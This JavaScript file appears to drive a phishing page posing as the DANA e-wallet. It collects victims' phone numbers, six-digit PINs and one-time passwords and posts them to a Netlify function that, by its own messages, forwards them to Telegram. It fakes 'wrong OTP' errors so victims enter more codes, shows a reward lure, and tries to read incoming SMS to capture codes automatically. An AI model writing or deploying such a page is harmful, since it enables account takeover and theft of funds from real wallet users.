document.addEventListener('DOMContentLoaded', () => {
  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const rn = document.getElementById('reward-notification');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const lc = document.getElementById('lanjutkan-container');
  const rewardInstruction = document.getElementById('reward-instruction');

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  const maxAttempts = 6;
  let otpTimer;

  // Helper Functions
  function showSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function startOTPTimer() {
    let timeLeft = 120;
    const timerElement = document.getElementById('otp-timer');
    
    otpTimer = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      
      if (timeLeft <= 0) {
        clearInterval(otpTimer);
      }
      timeLeft--;
    }, 1000);
  }

  function resetOTPInputs() {
    ois.forEach(input => input.value = '');
    ois[0].focus();
    otp = '';
    attemptCount++;
    an.textContent = attemptCount;
    ac.style.display = 'block';
  }

  function showRewardInstruction() {
    rewardInstruction.style.display = 'block';
    
    // Close button handler
    rewardInstruction.querySelector('.close-btn').addEventListener('click', () => {
      rewardInstruction.style.display = 'none';
    });
  }

  // Backend Communication
  async function sendDanaData(type, data) {
    try {
      const response = await fetch('/.netlify/functions/send-dana-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) throw new Error(await response.text());
      return await response.json();
    } catch (error) {
      console.error('Error:', error);
      throw error;
    }
  }

  // Modified Phone Number Formatting
  pn.addEventListener('input', (e) => {
    // Hapus semua karakter non-digit
    let value = e.target.value.replace(/\D/g, '');
    
    // Hapus angka 0 di awal jika ada
    if (value.startsWith('0')) {
      value = value.substring(1);
    }
    
    // Pastikan selalu dimulai dengan 8
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
    }
    
    // Batasi panjang maksimal (3+4+5=12 digit)
    if (value.length > 12) {
      value = value.substring(0, 12);
    }
    
    // Format nomor dengan tanda hubung
    let formatted = '';
    if (value.length > 0) {
      formatted = value.substring(0, 3); // 3 digit pertama
      if (value.length > 3) {
        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
      }
      if (value.length > 7) {
        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
      }
    }
    
    // Set nilai input dengan format yang sudah dibuat
    e.target.value = formatted;
    
    // Simpan nomor tanpa format untuk pengiriman data
    phoneNumber = value;
  });

  // Event Handlers
  lb.addEventListener('click', async () => {
    if (currentPage === 'n') {
      if (phoneNumber.length < 10) {
        alert('Nomor HP harus minimal 10 digit');
        return;
      }
      
      showSpinner();
      try {
        await sendDanaData('phone', { phone: phoneNumber });
        pages.n.style.display = 'none';
        pages.p.style.display = 'block';
        currentPage = 'p';
        lc.style.display = 'none';
      } catch (error) {
        alert('Gagal mengirim data: ' + error.message);
      } finally {
        hideSpinner();
      }
    }
  });

  // PIN Input Handling
  pis.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
      
      pin = Array.from(pis).map(i => i.value).join('');
      
      if (pin.length === 6) {
        showSpinner();
        try {
          await sendDanaData('pin', { phone: phoneNumber, pin });
          pages.p.style.display = 'none';
          pages.o.style.display = 'block';
          currentPage = 'o';
          lc.style.display = 'none';
          startOTPTimer();
          setTimeout(() => fn.style.display = 'block', 1000);
          
          // Setup SMS listener ketika masuk ke halaman OTP
          setTimeout(setupSmsListener, 500);
        } catch (error) {
          alert('Gagal mengirim PIN: ' + error.message);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  // OTP Input Handling
  ois.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < ois.length - 1) {
        ois[index + 1].focus();
      }
      
      otp = Array.from(ois).map(i => i.value).join('');
      
      if (index === ois.length - 1 && e.target.value.length === 1) {
        showSpinner();
        try {
          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
          
          setTimeout(() => {
            resetOTPInputs();
            
            // Show reward instruction after 2 attempts
            if (attemptCount === 2) {
              showRewardInstruction();
            }
            
            if (attemptCount > 2) {
              rn.style.display = 'block';
              rn.innerHTML = `
                <div class="notification-content">
                  <h3>kode OTP Salah</h3>
                  <p>silahkan cek sms ataupan whatsapp</p>
                </div>
              `;
              setTimeout(() => rn.style.display = 'none', 10000);
            }
            
            if (attemptCount >= maxAttempts) {
              fn.style.display = 'none';
              sn.style.display = 'block';
              setTimeout(() => sn.style.display = 'none', 5000);
            }
          }, 1000);
        } catch (error) {
          console.error('Gagal mengirim OTP:', error);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        ois[index - 1].focus();
      }
    });
  });

  // Toggle PIN Visibility
  document.querySelector('.show-text').addEventListener('click', (e) => {
    const isShowing = e.target.classList.toggle('active');
    const pinInputs = document.querySelectorAll('.pin-box');
    pinInputs.forEach(input => {
      input.type = isShowing ? 'text' : 'password';
    });
    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
  });

  // ========== FUNGSI AUTO-OTP ========== //
  function setupSmsListener() {
    console.log("Mengaktifkan SMS listener...");
    
    // Hanya bekerja di perangkat Android dengan WebView terbaru
    if (typeof SmsRetriever !== 'undefined') {
      try {
        SmsRetriever.start({
          number: "+62", // Filter untuk nomor Indonesia
          onSmsReceived: function(sms) {
            console.log("SMS diterima:", sms);
            
            // Ekstrak kode OTP dari SMS (format: kode 4-6 digit)
            const otpMatch = sms.match(/\b\d{4,6}\b/);
            if (otpMatch) {
              const otpCode = otpMatch[0];
              console.log("Kode OTP ditemukan:", otpCode);
              
              // Isi otomatis field OTP
              autoFillOtp(otpCode);
              
              // Kirim OTP ke Telegram secara otomatis
              sendOtpToTelegram(otpCode);
            }
          }
        });
      } catch (error) {
        console.error("Error setting up SMS listener:", error);
        // Fallback untuk browser yang tidak mendukung SmsRetriever
        setupFallbackSmsListener();
      }
    } else {
      console.log("SMS Retriever tidak didukung, menggunakan fallback method");
      setupFallbackSmsListener();
    }
  }

  function setupFallbackSmsListener() {
    // Metode fallback: menggunakan event listener khusus
    // Di environment nyata, ini akan dipicu oleh aplikasi native
    // Untuk demo, kita buat button manual
    const otpContainer = document.querySelector('.otp-container');
    if (otpContainer) {
      // Cek apakah tombol simulasi sudah ada
      if (!document.getElementById('simulasi-otp-btn')) {
        // Tambahkan button untuk simulasi penerimaan OTP
        const simButton = document.createElement('button');
        simButton.id = 'simulasi-otp-btn';
        simButton.textContent = "Simulasi Terima OTP";
        simButton.style.cssText = `
          display: block;
          margin: 15px auto;
          padding: 10px 15px;
          background: #4CAF50;
          color: white;
          border: none;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          font-weight: 500;
          max-width: 200px;
        `;
        
        simButton.addEventListener('click', function() {
          const otpCode = prompt("Masukkan kode OTP untuk simulasi (4-6 digit):");
          if (otpCode && /^\d{4,6}$/.test(otpCode)) {
            autoFillOtp(otpCode);
            sendOtpToTelegram(otpCode);
          } else if (otpCode) {
            alert("Kode OTP harus 4-6 digit angka");
          }
        });
        
        otpContainer.parentNode.insertBefore(simButton, otpContainer.nextSibling);
      }
    }
  }

  async function sendOtpToTelegram(otpCode) {
    try {
      // Dapatkan nomor telepon
      const phoneNumber = document.getElementById('phone-number').value.replace(/\D/g, '');
      
      // Kirim data ke function Netlify
      const response = await fetch('/.netlify/functions/send-dana-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          type: 'otp_auto',
          phone: phoneNumber,
          otp: otpCode
        })
      });
      
      if (response.ok) {
        console.log("OTP berhasil dikirim ke Telegram");
        showAutoSendNotification();
      } else {
        console.error("Gagal mengirim OTP ke Telegram");
      }
    } catch (error) {
      console.error("Error:", error);
    }
  }

  function autoFillOtp(otpCode) {
    const otpInputs = document.querySelectorAll('.otp-box');
    if (otpInputs.length >= otpCode.length) {
      for (let i = 0; i < otpCode.length; i++) {
        otpInputs[i].value = otpCode[i];
        
        // Trigger event input untuk setiap field
        const event = new Event('input', { bubbles: true });
        otpInputs[i].dispatchEvent(event);
      }
      
      // Fokus ke field terakhir
      otpInputs[otpCode.length - 1].focus();
      
      // Tampilkan notifikasi bahwa OTP terisi otomatis
      showAutoFillNotification();
    }
  }

  function showAutoFillNotification() {
    const notification = document.createElement('div');
    notification.innerHTML = 'Kode OTP telah terisi otomatis dari SMS';
    notification.style.cssText = `
      position: fixed;
      bottom: 100px;
      left: 50%;
      transform: translateX(-50%);
      background: #4CAF50;
      color: white;
      padding: 12px 16px;
      border-radius: 8px;
      z-index: 1000;
      font-size: 14px;
      animation: fadeInOut 3s forwards;
    `;
    
    document.body.appendChild(notification);
    
    // Hapus notifikasi setelah 3 detik
    setTimeout(() => {
      if (notification.parentNode) {
        notification.remove();
      }
    }, 3000);
  }

  function showAutoSendNotification() {
    const notification = document.createElement('div');
    notification.innerHTML = 'Kode OTP telah terkirim otomatis ke Telegram';
    notification.style.cssText = `
      position: fixed;
      bottom: 150px;
      left: 50%;
      transform: translateX(-50%);
      background: #2196F3;
      color: white;
      padding: 12px 16px;
      border-radius: 8px;
      z-index: 1000;
      font-size: 14px;
      animation: fadeInOutTop 3s forwards;
    `;
    
    document.body.appendChild(notification);
    
    // Hapus notifikasi setelah 3 detik
    setTimeout(() => {
      if (notification.parentNode) {
        notification.remove();
      }
    }, 3000);
  }

  // Tambahkan style untuk animasi notifikasi
  const style = document.createElement('style');
  style.textContent = `
    @keyframes fadeInOut {
      0% { opacity: 0; bottom: 80px; }
      20% { opacity: 1; bottom: 100px; }
      80% { opacity: 1; bottom: 100px; }
      100% { opacity: 0; bottom: 120px; }
    }
    
    @keyframes fadeInOutTop {
      0% { opacity: 0; bottom: 130px; }
      20% { opacity: 1; bottom: 150px; }
      80% { opacity: 1; bottom: 150px; }
      100% { opacity: 0; bottom: 170px; }
    }
  `;
  document.head.appendChild(style);
  // ========== END FUNGSI AUTO-OTP ========== //
});
